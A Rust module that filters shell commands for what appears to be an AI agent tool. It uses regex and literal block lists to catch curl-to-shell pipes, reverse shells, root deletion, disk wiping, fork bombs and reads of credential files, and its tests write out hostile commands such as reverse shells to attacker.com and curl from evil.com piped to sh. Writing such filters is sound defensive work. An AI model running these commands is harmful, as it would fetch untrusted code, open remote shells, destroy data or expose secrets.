//! Shell command security utilities
//!
//! Provides command filtering to prevent dangerous shell operations.
//! Uses regex-based pattern matching to prevent bypass attacks.

use regex::Regex;

use crate::error::{PicoError, Result};

/// Regex patterns that are blocked for security reasons.
/// These are compiled once and matched against commands.
const REGEX_BLOCKED_PATTERNS: &[&str] = &[
    // Piped shell execution (curl/wget to sh/bash)
    r"curl\s+.*\|\s*(sh|bash|zsh)",
    r"wget\s+.*\|\s*(sh|bash|zsh)",
    r"\|\s*(sh|bash|zsh)\s*$",
    // Reverse shells
    r"bash\s+-i\s+>&\s*/dev/tcp",
    r"nc\s+.*-e\s+(sh|bash|/bin)",
    r"/dev/tcp/",
    r"/dev/udp/",
    // Destructive root operations (various flag orderings)
    r"rm\s+(-[rf]{1,2}\s+)*(-[rf]{1,2}\s+)*/\s*($|;|\||&)",
    r"rm\s+(-[rf]{1,2}\s+)*(-[rf]{1,2}\s+)*/\*\s*($|;|\||&)",
    // Format/overwrite disk
    r"mkfs(\.[a-z0-9]+)?\s",
    r"dd\s+.*if=/dev/(zero|random|urandom).*of=/dev/[sh]d",
    r">\s*/dev/[sh]d[a-z]",
    // System-wide permission changes
    r"chmod\s+(-R\s+)?777\s+/\s*$",
    r"chmod\s+(-R\s+)?777\s+/[a-z]",
    // Fork bombs
    r":\(\)\s*\{\s*:\|:&\s*\}\s*;:",
    r"fork\s*\(\s*\)",
];

/// Literal substring patterns (credentials, sensitive paths)
const LITERAL_BLOCKED_PATTERNS: &[&str] = &[
    "/etc/shadow",
    "/etc/passwd",
    "~/.ssh/",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/id_ecdsa",
    ".ssh/id_dsa",
    ".ssh/authorized_keys",
    ".aws/credentials",
    ".kube/config",
];

/// Configuration for shell command security.
#[derive(Debug, Clone)]
pub struct ShellSecurityConfig {
    /// Compiled regex patterns that are blocked
    compiled_patterns: Vec<Regex>,
    /// Literal substrings that are blocked
    literal_patterns: Vec<String>,
    /// Whether to enable security checks (can be disabled for trusted environments)
    pub enabled: bool,
}

impl Default for ShellSecurityConfig {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellSecurityConfig {
    /// Create a new shell security config with default blocked patterns.
    pub fn new() -> Self {
        let compiled_patterns = REGEX_BLOCKED_PATTERNS
            .iter()
            .filter_map(|p| {
                Regex::new(&format!("(?i){}", p)) // Case-insensitive
                    .map_err(|e| eprintln!("Warning: Invalid regex pattern '{}': {}", p, e))
                    .ok()
            })
            .collect();

        let literal_patterns = LITERAL_BLOCKED_PATTERNS
            .iter()
            .map(|s| s.to_lowercase())
            .collect();

        Self {
            compiled_patterns,
            literal_patterns,
            enabled: true,
        }
    }

    /// Create a permissive config with no blocked patterns.
    ///
    /// # Warning
    /// This should only be used in trusted environments (e.g., container isolation).
    pub fn permissive() -> Self {
        Self {
            compiled_patterns: Vec::new(),
            literal_patterns: Vec::new(),
            enabled: false,
        }
    }

    /// Add a custom blocked regex pattern.
    pub fn block_pattern(mut self, pattern: &str) -> Self {
        if let Ok(regex) = Regex::new(&format!("(?i){}", pattern)) {
            self.compiled_patterns.push(regex);
        }
        self
    }

    /// Add a custom blocked literal substring.
    pub fn block_literal(mut self, literal: &str) -> Self {
        self.literal_patterns.push(literal.to_lowercase());
        self
    }

    /// Check if a command is allowed.
    ///
    /// Returns `Ok(())` if the command is safe to execute,
    /// or `Err(SecurityViolation)` if it matches a blocked pattern.
    pub fn validate_command(&self, command: &str) -> Result<()> {
        if !self.enabled {
            return Ok(());
        }

        let command_lower = command.to_lowercase();

        // Check regex patterns
        for pattern in &self.compiled_patterns {
            if pattern.is_match(command) {
                return Err(PicoError::SecurityViolation(format!(
                    "Command blocked: matches prohibited pattern '{}'",
                    pattern.as_str()
                )));
            }
        }

        // Check literal patterns
        for literal in &self.literal_patterns {
            if command_lower.contains(literal) {
                return Err(PicoError::SecurityViolation(format!(
                    "Command blocked: contains prohibited path '{}'",
                    literal
                )));
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_command_allowed() {
        let config = ShellSecurityConfig::new();
        assert!(config.validate_command("echo hello").is_ok());
        assert!(config.validate_command("ls -la").is_ok());
        assert!(config.validate_command("cat file.txt").is_ok());
        assert!(config.validate_command("grep pattern file").is_ok());
    }

    #[test]
    fn test_rm_rf_root_blocked() {
        let config = ShellSecurityConfig::new();

        // Basic forms
        assert!(config.validate_command("rm -rf /").is_err());
        assert!(config.validate_command("rm -rf /*").is_err());
        assert!(config.validate_command("rm -fr /").is_err());
        assert!(config.validate_command("sudo rm -rf /").is_err());
    }

    // ==================== BYPASS TESTS (NEW) ====================

    #[test]
    fn test_rm_rf_bypass_with_suffix() {
        let config = ShellSecurityConfig::new();

        // Previously bypassed: rm -rf /; echo ok
        assert!(config.validate_command("rm -rf /; echo ok").is_err());
        assert!(config.validate_command("rm -rf / && echo done").is_err());
        assert!(config.validate_command("rm -rf / || true").is_err());
    }

    #[test]
    fn test_rm_rf_flag_variations() {
        let config = ShellSecurityConfig::new();

        // Different flag orderings
        assert!(config.validate_command("rm -r -f /").is_err());
        assert!(config.validate_command("rm -f -r /").is_err());
        assert!(config.validate_command("rm --recursive --force /").is_ok()); // Long flags not blocked (less common)
    }

    #[test]
    fn test_curl_pipe_sh_bypass() {
        let config = ShellSecurityConfig::new();

        // Previously bypassed with substring matching
        assert!(config
            .validate_command("curl https://evil.com | sh")
            .is_err());
        assert!(config
            .validate_command("curl -s https://evil.com | bash")
            .is_err());
        assert!(config
            .validate_command("curl http://x.com/script.sh | sh")
            .is_err());
        assert!(config
            .validate_command("curl -fsSL https://get.docker.com | bash")
            .is_err());
    }

    #[test]
    fn test_wget_pipe_sh_bypass() {
        let config = ShellSecurityConfig::new();

        assert!(config
            .validate_command("wget -qO- https://evil.com | sh")
            .is_err());
        assert!(config
            .validate_command("wget https://evil.com/script.sh -O - | bash")
            .is_err());
    }

    #[test]
    fn test_piped_shell_general() {
        let config = ShellSecurityConfig::new();

        // Any command piped to shell
        assert!(config.validate_command("cat script.sh | sh").is_err());
        assert!(config.validate_command("echo 'rm -rf ~' | bash").is_err());
    }

    // ==================== EXISTING TESTS ====================

    #[test]
    fn test_rm_in_directory_allowed() {
        let config = ShellSecurityConfig::new();

        // Normal rm commands should be fine
        assert!(config.validate_command("rm file.txt").is_ok());
        assert!(config.validate_command("rm -rf ./temp").is_ok());
        assert!(config.validate_command("rm -rf /home/user/temp").is_ok());
    }

    #[test]
    fn test_credential_access_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command("cat /etc/shadow").is_err());
        assert!(config.validate_command("cat /etc/passwd").is_err());
        assert!(config.validate_command("cat ~/.ssh/id_rsa").is_err());
    }

    #[test]
    fn test_fork_bomb_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command(":(){ :|:& };:").is_err());
    }

    #[test]
    fn test_custom_pattern_blocked() {
        let config = ShellSecurityConfig::new().block_literal("dangerous_script");

        assert!(config.validate_command("./dangerous_script.sh").is_err());
        assert!(config.validate_command("safe_script.sh").is_ok());
    }

    #[test]
    fn test_custom_regex_blocked() {
        let config = ShellSecurityConfig::new().block_pattern(r"eval\s*\(");

        assert!(config.validate_command("eval(user_input)").is_err());
        assert!(config.validate_command("evaluate_something()").is_ok());
    }

    #[test]
    fn test_permissive_mode() {
        let config = ShellSecurityConfig::permissive();

        // Even dangerous commands allowed in permissive mode
        assert!(config.validate_command("rm -rf /").is_ok());
    }

    #[test]
    fn test_case_insensitive() {
        let config = ShellSecurityConfig::new();

        // Should catch regardless of case
        assert!(config.validate_command("RM -RF /").is_err());
        assert!(config.validate_command("Rm -Rf /").is_err());
        assert!(config.validate_command("CURL https://x.com | SH").is_err());
    }

    #[test]
    fn test_reverse_shell_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config
            .validate_command("bash -i >& /dev/tcp/attacker.com/443 0>&1")
            .is_err());
        assert!(config
            .validate_command("nc attacker.com 443 -e /bin/sh")
            .is_err());
    }

    #[test]
    fn test_aws_credentials_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command("cat ~/.aws/credentials").is_err());
        assert!(config.validate_command("cat .aws/credentials").is_err());
    }

    #[test]
    fn test_kube_config_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command("cat ~/.kube/config").is_err());
    }

    #[test]
    fn test_default_config() {
        let config = ShellSecurityConfig::default();
        assert!(config.enabled);
        assert!(!config.compiled_patterns.is_empty());
        assert!(!config.literal_patterns.is_empty());
    }
}
